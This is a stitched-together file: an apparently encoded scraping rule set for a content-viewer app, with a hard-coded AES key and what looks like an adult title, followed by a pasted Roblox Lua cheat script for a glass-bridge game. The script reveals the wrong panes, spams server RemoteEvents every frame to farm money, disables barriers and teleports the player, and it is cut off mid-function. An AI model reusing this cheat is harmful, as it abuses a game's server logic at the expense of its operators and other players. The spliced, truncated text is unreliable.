FxcbiAgICBkZXNjOiBNWV9QQVJBTVMuZGVzYyxcXFxcbiAgICBpbWc6IE1ZX1BBUkFNUy5pbWcsXFxcXG4gICAgdXJsOiAnaGlrZXI6Ly9lbXB0eScsXFxcXG4gICAgY29sX3R5cGU6ICdhdmF0YXInXFxcXG59KVxcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogYXBpdmlldy5ncmF5KE1ZX1BBUkFNUy5kZXNjMSksXFxcXG4gICAgY29sX3R5cGU6ICdyaWNoX3RleHQnLFxcXFxufSlcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IGFwaXZpZXcuYmlnKGFwaXZpZXcuc3Ryb25nKCfnm7jlhbPlm57lpI3lhbEnK01ZX1BBUkFNUy5pdGVtLmxlbmd0aCsn5p2hJykpLFxcXFxuICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXFxcbn0pXFxcXG5NWV9QQVJBTVMuaXRlbS5yZXZlcnNlKCkuZm9yRWFjaChkYXRhID0+IHtcXFxcbiAgICBpZiAoZGF0YS5hdmF0YXIgPT0gJycpIHtcXFxcbiAgICAgICAgdmFyIGF2YXRhciA9ICdodHRwczovL2ltZy52aW51YS5jbi9pbWFnZXMvSW5uRGsudGgucG5nJ1xcXFxuICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIHZhciBhdmF0YXIgPSBhcGl2aWV3LkRlY3J5cHQxKCdodHRwczovL2ptdHAuZ3BncmVpaS5jb20nICsgZGF0YS5hdmF0YXIpXFxcXG4gICAgfVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBkYXRhLmF1dGhvcixcXFxcbiAgICAgICAgZGVzYzogZGF0YS5jcmVhdGVkX2F0LFxcXFxuICAgICAgICBpbWc6IGF2YXRhcixcXFxcbiAgICAgICAgdXJsOiAnaGlrZXI6Ly9lbXB0eScsXFxcXG4gICAgICAgIGNvbF90eXBlOiAnYXZhdGFyJ1xcXFxuICAgIH0pXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IGFwaXZpZXcuYWRkcmVzc1RhZygnaGlrZXI6Ly9lbXB0eScsJ0AnK2RhdGEudGFnX2F1dGhvcisnXFxcXFxcXFx0XFxcXFxcXFx0XFxcXFxcXFx0JykrYXBpdmlldy5ncmF5KGRhdGEudGV4dCksXFxcXG4gICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXFxcbiAgICB9KVxcXFxufSlcXFxcbnNldFJlc3VsdChkKVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIummlumhtVxcXCIsXFxcInBhdGhcXFwiOlxcXCJob21lXFxcIixcXFwicnVsZVxcXCI6XFxcImlmKE1ZX1BBR0UgPT0gJzEnKXtcXFxcbnZhciBlbmREYXRlID0gXFxcXFxcXCIyMDE5LTExLTA4XFxcXFxcXCI7XFxcXG52YXIgZGF0ZXNBcnJheSA9IGFwaXZpZXcuZ2V0RGF0ZXNBcnJheShlbmREYXRlKTtcXFxcbnZhciB1cmwgPSBhcGl2aWV3Lmhvc3QrJy92Mi41L2FydGljbGUvZGF5J1xcXFxudmFyIHB1Ymxpc2hlZF9hdCA9IGdldE15VmFyKFxcXFxcXFwicHVibGlzaGVkX2F0XFxcXFxcXCIpID09ICcnID8gZGF0ZXNBcnJheVswXSA6IGdldE15VmFyKFxcXFxcXFwicHVibGlzaGVkX2F0XFxcXFxcXCIpOyAvL2xvZyhwdWJsaXNoZWRfYXQpXFxcXG52YXIgYm9keSA9IGFwaXZpZXcuRW5jcnlwdCgncHVibGlzaGVkX2F0PScrcHVibGlzaGVkX2F0KVxcXFxudmFyIGRhdGEgPSBKU09OLnBhcnNlKGFwaXZpZXcuZ2V0aHRtbCh1cmwsYm9keSkpLmRhdGE7XFxcXG5kYXRhLmluZm8uZm9yRWFjaChpdGVtID0+IHtcXFxcbiAgICB2YXIgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxcXG4gICAgaWYoaXRlbS5tb2RlbF9pZCA9PSAnNicpe1xcXFxuICAgIHZhciB1cmwgPSBgaGlrZXI6Ly9wYWdlL2VyamkxP3BhZ2U9ZnlwYWdlI25vSGlzdG9yeSNgXFxcXG4gICAgfWVsc2V7XFxcXG4gICAgdmFyIHVybCA9IGBoaWtlcjovL3BhZ2UvZXJqaT9wYWdlPWZ5cGFnZSNub0hpc3RvcnkjI2dhbWVUaGVtZSNgXFxcXG4gICAgfVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBgJHthcGl2aWV3LnN0cm9uZyhpdGVtLnRpdGxlKX08YnI+JHthcGl2aWV3LmdyYXkoaXRlbS5hdXRob3IpfTxicj4ke2FwaXZpZXcuZ3JheShpdGVtLmRlc2NyaXB0aW9uLnJlcGxhY2UoL1xcXFxcXFxcbi9nLCc8YnI+JykpfWAsXFxcXG4gICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcXFxuICAgIH0pXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgaW1nOiBpbWcsXFxcXG4gICAgICAgIHVybDogdXJsLFxcXFxuICAgICAgICBjb2xfdHlwZTogJ3BpY18xX2Z1bGwnLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgbW9kZWxfaWQ6IGl0ZW0ubW9kZWxfaWQsXFxcXG4gICAgICAgICAgICBpZDogaXRlbS5pZCxcXFxcbiAgICAgICAgICAgIGltZzogaW1nXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIGNvbF90eXBlOiAnbGluZV9ibGFuaydcXFxcbiAgICB9KVxcXFxufSlcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6ICfigJzigJzliIfmjaLigJ3igJ0nLFxcXFxuICAgIHVybDogJCgpLmxhenlSdWxlKChwdWJsaXNoZWRfYXQsZGF0ZXNBcnJheSkgPT4ge1xcXFxuICAgICAgICBzaG93U2VsZWN0T3B0aW9ucyh7XFxcXG4gICAgICAgICAgICB0aXRsZTogJ+W9k+WJje+8micrcHVibGlzaGVkX2F0LFxcXFxuICAgICAgICAgICAgb3B0aW9uczogZGF0ZXNBcnJheSxcXFxcbiAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcInB1Ymxpc2hlZF9hdFxcXFxcXFwiLGlucHV0KTtcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8vXFxcXFxcXCIgKyBpbnB1dFxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgIH0scHVibGlzaGVkX2F0LGRhdGVzQXJyYXkpLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIlxcXFxufSlcXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkuoznuqdcXFwiLFxcXCJwYXRoXFxcIjpcXFwiZXJqaVxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbnZhciBhcGl2aWV3ID0gJC5yZXF1aXJlKFxcXFxcXFwiaGFuc2h1XFxcXFxcXCIpXFxcXG52YXIgbW9kZWxfaWQgPSBNWV9QQVJBTVMubW9kZWxfaWQ7IC8vbG9nKHR5cGVvZiBtb2RlbF9pZClcXFxcbnZhciBpZCA9IE1ZX1BBUkFNUy5pZDsgLy9sb2coaWQpXFxcXG52YXIgaW1nID0gTVlfUEFSQU1TLmltZ1xcXFxudmFyIGQgPSBbXTtcXFxcblxcXFxuaWYoTVlfUEFHRSA9PSAnMScpe1xcXFxudmFyIHVybCA9IGFwaXZpZXcuaG9zdCsnL3YyLjUvYXJ0aWNsZS9kZXRhaWwnXFxcXG52YXIgYm9keSA9IGFwaXZpZXcuRW5jcnlwdCgnaWQ9JytpZClcXFxcbnZhciBkYXRhID0gSlNPTi5wYXJzZShhcGl2aWV3LmdldGh0bWwodXJsLGJvZHkpKS5kYXRhOyAvL2xvZyhkYXRhKVxcXFxuc3dpdGNoIChtb2RlbF9pZCkge1xcXFxuICAgIGNhc2UgMTpcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIGltZzogaW1nLFxcXFxuICAgICAgICAgICAgdXJsOiBpbWcsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3BpY18xX2Z1bGwnXFxcXG4gICAgICAgIH0pXFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogYCR7YXBpdmlldy5zdHJvbmcoYXBpdmlldy5jZW50ZXIoZGF0YS50aXRsZSkpfSR7YXBpdmlldy5ncmF5KGRhdGEuZGVzY3JpcHRpb24pfSR7YXBpdmlldy5ncmF5KGFwaXZpZXcuY2VudGVyKGRhdGEuYXV0aG9yKSl9YCxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcXFxuICAgICAgICB9KVxcXFxuICAgICAgICBicmVhaztcXFxcbiAgICBjYXNlIDI6XFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogYDxoMT4ke2FwaXZpZXcuc3Ryb25nKGRhdGEudGl0bGUpfTwvaDE+JHthcGl2aWV3LmdyYXkoZGF0YS5hdXRob3IpfWAsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCdcXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgYXBpdmlldy50dXdlbihkLGRhdGEpXFxcXG4gICAgICAgIGJyZWFrO1xcXFxuICAgIGNhc2UgMzpcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIGltZzogaW1nLFxcXFxuICAgICAgICAgICAgdXJsOiBpbWcsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3BpY18xX2Z1bGwnXFxcXG4gICAgICAgIH0pXFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOinhumikeKAneKAnScsXFxcXG4gICAgICAgICAgICB1cmw6ICdodHRwczovL2FrbWFpdmlkZW8uY2RjaHVhbmdhby5jb20nICsgZGF0YS52aWRlb19maWxlLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJ1xcXFxuICAgICAgICB9KVxcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IGA8aDE+JHthcGl2aWV3LnN0cm9uZyhkYXRhLnRpdGxlKX08L2gxPiR7YXBpdmlldy5ncmF5KGRhdGEuYXV0aG9yKX1gLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxcXG4gICAgICAgIH0pXFxcXG4gICAgICAgIGFwaXZpZXcudHV3ZW4oZCxkYXRhKVxcXFxuICAgICAgICBicmVhaztcXFxcbiAgICBjYXNlIDQ6XFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogYDxoMT4ke2FwaXZpZXcuc3Ryb25nKGRhdGEudGl0bGUpfTwvaDE+JHthcGl2aWV3LmdyYXkoZGF0YS5hdXRob3IpfWAsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCdcXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgYXBpdmlldy50dXdlbihkLGRhdGEpXFxcXG4gICAgICAgIGJyZWFrO1xcXFxuICAgIGNhc2UgNTpcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIGltZzogaW1nLFxcXFxuICAgICAgICAgICAgdXJsOiBpbWcsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3BpY18xX2Z1bGwnXFxcXG4gICAgICAgIH0pXFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOeUteWPsOKAneKAnScsXFxcXG4gICAgICAgICAgICB1cmw6ICdodHRwczovL2FrbWFpdmlkZW8uY2RjaHVhbmdhby5jb20nICsgZGF0YS52aWRlbyxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMSdcXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBgPGgxPiR7YXBpdmlldy5zdHJvbmcoZGF0YS50aXRsZSl9PC9oMT4ke2FwaXZpZXcuZ3JheShkYXRhLmF1dGhvcil9YCxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcXFxuICAgICAgICB9KVxcXFxuICAgICAgICBhcGl2aWV3LnR1d2VuKGQsZGF0YSlcXFxcbiAgICAgICAgYnJlYWs7XFxcXG4gICAgY2FzZSA2OlxcXFxuXFxcXG4gICAgICAgIGJyZWFrO1xcXFxufVxcXFxuaWYoZ2V0TXlWYXIoJ2ExJywnY3JlYXRlZF9hdCcpID09ICdjcmVhdGVkX2F0Jyl7XFxcXG52YXIgdGV4dCA9ICflvZPliY3mjpLluo/vvJrmjInml7bpl7QnXFxcXG59XFxcXG5pZihnZXRNeVZhcignYTEnKSA9PSAnbGlrZXMnKXtcXFxcbnZhciB0ZXh0ID0gJ+W9k+WJjeaOkuW6j++8muaMieeDreW6pidcXFxcbn1cXFxcbi8vbG9nKGdldE15VmFyKCdhMScsJ2NyZWF0ZWRfYXQnKSlcXFxcbnZhciBwYWl4dSA9ICQoJyNub0xvYWRpbmcjJykuYjY0KCkubGF6eVJ1bGUoKCkgPT4ge1xcXFxuICAgIGlmKGdldE15VmFyKCdhMScsJ2NyZWF0ZWRfYXQnKSA9PSAnY3JlYXRlZF9hdCcpe1xcXFxuICAgICAgICBwdXRNeVZhcignYTEnLCdsaWtlcycpXFxcXG4gICAgICAgIHRvYXN0KCfmjInng63luqYnKVxcXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxcXG4gICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICB9XFxcXG4gICAgaWYoZ2V0TXlWYXIoJ2ExJykgPT0gJ2xpa2VzJyl7XFxcXG4gICAgICAgIHB1dE15VmFyKCdhMScsJ2NyZWF0ZWRfYXQnKVxcXFxuICAgICAgICB0b2FzdCgn5oyJ5pe26Ze0JylcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKVxcXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgfVxcXFxufSlcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IGFwaXZpZXcuYmlnKGFwaXZpZXcuc3Ryb25nKCfnm7jlhbPlm57lpI3lhbEnK2RhdGEucmVwbHlfY291bnRzKyfmnaEnKSkrJ1xcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdCcrYXBpdmlldy5hZGRyZXNzVGFnKHBhaXh1LHRleHQpLFxcXFxuICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXFxcbn0pXFxcXG59XFxcXG52YXIgdXJsID0gYXBpdmlldy5ob3N0KycvdjIuNS9jb21tZW50L2xpc3QnXFxcXG52YXIgYm9keSA9IGFwaXZpZXcuRW5jcnlwdCgnYXJ0aWNsZV9pZD0nK2lkKycmcGFnZT0nK01ZX1BBR0UrJyZzaXplPTIwJnNvcnRpbmc9JytnZXRNeVZhcignYTEnLCdjcmVhdGVkX2F0JykpXFxcXG52YXIgZGF0YSA9IEpTT04ucGFyc2UoYXBpdmlldy5nZXRodG1sKHVybCwgYm9keSkpLmRhdGE7IC8vbG9nKGRhdGEpXFxcXG5hcGl2aWV3LnBpbmdsdW4oZCxkYXRhKVxcXFxuXFxcXG5zZXRSZXN1bHQoZClcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLlj5HnjrBcXFwiLFxcXCJwYXRoXFxcIjpcXFwiY2xhXFxcIixcXFwicnVsZVxcXCI6XFxcInZhciBlbmREYXRlID0gXFxcXFxcXCIyMDIxLTA5LTAxXFxcXFxcXCI7XFxcXG52YXIgaGUxID0gWyflm77mlocnLCfpmIXor7snLCflvbHop4YnLCfnlLXlj7AnLCflhpnnnJ8nLCfmvKvnlLsnXTsgLy9sb2coaGUxKSBcXFxcbnZhciBzdWJzMSA9IFsnMScsJzInLCczJywnNScsJzAnLCcwJ107IC8vbG9nKHN1YnMxKSBcXFxcbnZhciBzdWJzMiA9IGFwaXZpZXcuZ2V0WWVhck1vbnRoQXJyYXkoZW5kRGF0ZSk7IC8vbG9nKHN1YnMyKVxcXFxuaWYoTVlfUEFHRSA9PSAnMScpe1xcXFxuaGUxLmZvckVhY2goKHgsaSk9PntcXFxcbiAgICB2YXIgY3RpdGxlMSA9IHhcXFxcbiAgICB2YXIgc3ViMSA9IHN1YnMxW2ldXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IGdldE15VmFyKCdjdGl0bGUxJywgaGUxWzBdKSA9PSBjdGl0bGUxID8gJ+KAnOKAnOKAneKAnScrY3RpdGxlMS5mb250Y29sb3IoJyMnK2dldFJhbmdlQ29sb3JzKCkpOmN0aXRsZTEsXFxcXG4gICAgICAgIHVybDogJCgnI25vTG9hZGluZyMjbm9IaXN0b3J5IycpLmxhenlSdWxlKChjdGl0bGUxLHN1YjEpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImN0aXRsZTFcXFxcXFxcIiwgY3RpdGxlMSk7XFxcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJzdWIxXFxcXFxcXCIsc3ViMSk7ICAgICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgICAgICAgICAgfSwgY3RpdGxlMSxzdWIxKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwic2Nyb2xsX2J1dHRvblxcXFxcXFwiXFxcXG4gICAgfSlcXFxcbn0pXFxcXG59XFxcXG52YXIgaGUxID0gZ2V0TXlWYXIoXFxcXFxcXCJjdGl0bGUxXFxcXFxcXCIsaGUxWzBdKTsgLy9sb2coaGUxKVxcXFxudmFyIHN1YjEgPSBnZXRNeVZhcihcXFxcXFxcInN1YjFcXFxcXFxcIixzdWJzMVswXSk7IC8vbG9nKHN1YjEpXFxcXG52YXIgc3ViMiA9IHN1YnMyW01ZX1BBR0UtMV07IC8vbG9nKHN1YjIpXFxcXG5cXFxcbmlmKGhlMSA9PSAn5YaZ55yfJyl7XFxcXG52YXIgdXJsID0gYXBpdmlldy5ob3N0KycvdjIuNS9zZXJpZXMvYWxidW0vbGlzdCdcXFxcbnZhciBib2R5ID0gYXBpdmlldy5FbmNyeXB0KCd0eXBlPScrc3ViMSsnJnBhZ2U9JytNWV9QQUdFKycmc2l6ZT0zMSZzb3J0PXB1Ymxpc2hlZF9hdCcpXFxcXG59ZWxzZSBpZihoZTEgPT0gJ+a8q+eUuycpe1xcXFxudmFyIHVybCA9IGFwaXZpZXcuaG9zdCsnL3YyLjUvc2VyaWVzL21hbmdhL2xpc3QnXFxcXG52YXIgYm9keSA9IGFwaXZpZXcuRW5jcnlwdCgndHlwZT0nK3N1YjErJyZwYWdlPScrTVlfUEFHRSsnJnNpemU9MzEmc29ydD1wdWJsaXNoZWRfYXQnKVxcXFxufWVsc2V7XFxcXG52YXIgdXJsID0gYXBpdmlldy5ob3N0KycvdjIuNS9hcnRpY2xlL2Rpc2NvdmVyeSdcXFxcbnZhciBib2R5ID0gYXBpdmlldy5FbmNyeXB0KCdtb2RlbF9pZD0nK3N1YjErJyZwdWJsaXNoZWRfYXQ9JytzdWIyKycmcGFnZT0xJnNpemU9MzEnKVxcXFxufVxcXFxudmFyIGRhdGEgPSBKU09OLnBhcnNlKGFwaXZpZXcuZ2V0aHRtbCh1cmwsYm9keSkpLmRhdGE7XFxcXG5cXFxcbnN3aXRjaCAoc3ViMSkge1xcXFxuICAgIGNhc2UgJzAnOlxcXFxuICAgICAgICBhcGl2aWV3LnhpZXpoZW5tYW5odWF5aWppKGQsZGF0YSlcXFxcbiAgICAgICAgYnJlYWs7XFxcXG4gICAgY2FzZSAnMSc6XFxcXG4gICAgICAgIGFwaXZpZXcudHV3ZW55aWppKGQsIGRhdGEpXFxcXG4gICAgICAgIGJyZWFrO1xcXFxuICAgIGNhc2UgJzInOlxcXFxuICAgICAgICBhcGl2aWV3Lnl1ZWR1eWlqaShkLCBkYXRhKVxcXFxuICAgICAgICBicmVhaztcXFxcbiAgICBjYXNlICczJzpcXFxcbiAgICAgICAgYXBpdmlldy55aW5nc2hpeWlqaShkLCBkYXRhKVxcXFxuICAgICAgICBicmVhaztcXFxcbiAgICBjYXNlICc1JzpcXFxcbiAgICAgICAgYXBpdmlldy5kaWFudGFpeWlqaShkLCBkYXRhKVxcXFxuICAgICAgICBicmVhaztcXFxcbn1cXFwifV1cIn0iLCJwaWNVcmwiOiJodHRwczovL2ptdHAuZ3BncmVpaS5jb20vc3RvcmFnZS90aHVtYi8yNzcwNy82N2EyMTE2N2I0MDdjLmpwZ0Bqcz0kLmhpa2VyLk1ZX1RJVExFID0gXCLkuIDkuKpBUFBcIjsoXG4oKSA9PiB7XG4gICAgY29uc3QgQ3J5cHRvVXRpbCA9ICQucmVxdWlyZShcImhpa2VyOi8vYXNzZXRzL2NyeXB0by1qYXZhLmpzXCIpO1xuICAgIGxldCBrZXkgPSBDcnlwdG9VdGlsLkRhdGEucGFyc2VVVEY4KFwic2FJWlhjNHlNdnEwSXo1NlwiKTtcbiAgICBsZXQgaXYgPSBDcnlwdG9VdGlsLkRhdGEucGFyc2VVVEY4KFwia2JKWXRCSlVFQ1Qwb3lqb1wiKTtcbiAgICBsZXQgdGV4dERhdGEgPSBDcnlwdG9VdGlsLkRhdGEucGFyc2VJbnB1dFN0cmVhbShpbnB1dCk7XG4gICAgbGV0IGVuY3J5cHRlZCA9IENyeXB0b1V0aWwuQUVTLmRlY3J5cHQodGV4dERhdGEsIGtleSwge21vZGU6IFwiQUVTL0NCQy9QS0NTN1BhZGRpbmdcIiwgaXY6IGl2fSk7XG4gICAgcmV0dXJuIGVuY3J5cHRlZC50b0lucHV0U3RyZWFtKCk7XG59XG4pKCkiLCJ0aXRsZSI6IlBPTkRFTUlYICjpm6rlm73jgYrjgb7jgosp772c5L2c5ZOBLeW4ruWKqeS6huS4gOS9jeaXoOWkhOWPr+WOu+eahOa3q+iNoeWPiOe6r+a0geWls+WtqX7lpbnpgJrov4fopoHmsYJTRVjmnaXlm57miqXigLzvuI/ikaAifQ==
ZMABfAKh,"The $1,000,000 Glass Bridge",haidar_at,JavaScript,Friday 18th of April 2025 08:53:18 AM CDT,"local Players = game:GetService(""Players"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local RunService = game:GetService(""RunService"")

local player = Players.LocalPlayer

-- Screen GUI
local gui = Instance.new(""ScreenGui"")
gui.Name = ""ModernControlGui""
gui.Parent = player:WaitForChild(""PlayerGui"")
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true

-- Toggle Panel Button
local toggleBtn = Instance.new(""TextButton"")
toggleBtn.Size = UDim2.new(0, 40, 0, 40)
toggleBtn.Position = UDim2.new(0.5, -20, 0.5, -20)
toggleBtn.Text = ""⚙""
toggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
toggleBtn.TextColor3 = Color3.new(1, 1, 1)
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextSize = 22
toggleBtn.ZIndex = 5
toggleBtn.Active = true
toggleBtn.Draggable = true
toggleBtn.Parent = gui

local toggleUICorner = Instance.new(""UICorner"", toggleBtn)
toggleUICorner.CornerRadius = UDim.new(0, 8)

-- UI Container
local mainFrame = Instance.new(""Frame"")
mainFrame.Size = UDim2.new(0, 300, 0, 420)
mainFrame.Position = UDim2.new(0.5, -150, 0.3, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
mainFrame.BorderSizePixel = 0
mainFrame.AnchorPoint = Vector2.new(0.5, 0)
mainFrame.ClipsDescendants = true
mainFrame.Visible = false
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = gui

local stroke = Instance.new(""UIStroke"", mainFrame)
stroke.Color = Color3.fromRGB(80, 80, 80)
stroke.Thickness = 2

local corner = Instance.new(""UICorner"", mainFrame)
corner.CornerRadius = UDim.new(0, 12)

-- Title/Header
local header = Instance.new(""TextLabel"")
header.Size = UDim2.new(1, 0, 0, 50)
header.Position = UDim2.new(0, 0, 0, 0)
header.BackgroundTransparency = 1
header.Text = ""⚙ Control Panel""
header.TextColor3 = Color3.fromRGB(255, 255, 255)
header.Font = Enum.Font.GothamBold
header.TextSize = 20
header.TextYAlignment = Enum.TextYAlignment.Center
header.TextXAlignment = Enum.TextXAlignment.Center
header.Parent = mainFrame

-- Layout
local layout = Instance.new(""UIListLayout"")
layout.Padding = UDim.new(0, 10)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Top
layout.Parent = mainFrame

local padding = Instance.new(""UIPadding"")
padding.PaddingTop = UDim.new(0, 60)
padding.PaddingLeft = UDim.new(0, 15)
padding.PaddingRight = UDim.new(0, 15)
padding.Parent = mainFrame

-- Show/Hide Panel
toggleBtn.MouseButton1Click:Connect(function()
	mainFrame.Visible = not mainFrame.Visible
end)

-- Toggle / Button Templates + Functions
local toggleStates = {}
local function createToggle(name, callback)
	local container = Instance.new(""Frame"")
	container.Size = UDim2.new(1, 0, 0, 40)
	container.BackgroundTransparency = 1

	local label = Instance.new(""TextLabel"")
	label.Size = UDim2.new(0.6, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Text = name
	label.TextColor3 = Color3.fromRGB(200, 200, 200)
	label.Font = Enum.Font.Gotham
	label.TextSize = 16
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Parent = container

	local toggle = Instance.new(""TextButton"")
	toggle.Size = UDim2.new(0, 40, 0, 24)
	toggle.Position = UDim2.new(1, -40, 0.5, -12)
	toggle.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
	toggle.Text = ""OFF""
	toggle.Font = Enum.Font.GothamBold
	toggle.TextColor3 = Color3.new(1, 1, 1)
	toggle.TextSize = 12
	toggle.Parent = container

	toggleStates[name] = false

	toggle.MouseButton1Click:Connect(function()
		toggleStates[name] = not toggleStates[name]
		toggle.Text = toggleStates[name] and ""ON"" or ""OFF""
		toggle.BackgroundColor3 = toggleStates[name] and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(200, 0, 0)
		callback(toggleStates[name])
	end)

	container.Parent = mainFrame
end

local function createButton(name, callback)
	local btn = Instance.new(""TextButton"")
	btn.Size = UDim2.new(1, 0, 0, 40)
	btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 16
	btn.Text = name
	btn.AutoButtonColor = true

	local btnCorner = Instance.new(""UICorner"")
	btnCorner.CornerRadius = UDim.new(0, 8)
	btnCorner.Parent = btn

	btn.MouseButton1Click:Connect(callback)
	btn.Parent = mainFrame
end

-- Features
local function adjustTransparency(isOn)
	local wrongFolder = workspace:FindFirstChild(""Glasses"") and workspace.Glasses:FindFirstChild(""Wrong"")
	if wrongFolder then
		for _, part in ipairs(wrongFolder:GetChildren()) do
			if part:IsA(""BasePart"") then
				part.Transparency = isOn and 1 or 0.5
			end
		end
	end
end

createToggle(""Show All"", adjustTransparency)

local remoteNames = {
	""VerifiedGears"", ""PlayFinalMusic"", ""GiveClaimMoney"", ""SolidWhiteEvent"",
	""ResetIndexCheck"", ""ChangeMoneyEvent"", ""ReturnMainSound"",
	""SecondChangeTextChest"", ""Delete_Rainbow_T"", ""PlayFinalMusic_2"",
}

local loopConnection = nil
createToggle(""Money"", function(isOn)
	if isOn then
		loopConnection = RunService.Heartbeat:Connect(function()
			for _, name in ipairs(remoteNames) do
				local remote = ReplicatedStorage:FindFirstChild(name)
				if remote and remote:IsA(""RemoteEvent"") then
					remote:FireServer()
				end
			end
		end)
	else
		if loopConnection then
			loopConnection:Disconnect()
			loopConnection = nil
		end
	end
end)

local function toggleRoadBarrier(isOn)
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA(""BasePart"") and obj.Name == ""RedBarrier"" then
			obj.CanCollide = not isOn
		end
	end
end

createToggle(""Road"", toggleRoadBarrier)

createButton(""Spawn"", function()
	player.Character:MoveTo(Vector3.new(-82.1566, 4.4729, -0.3147))
end)

createButton(""End"", function()
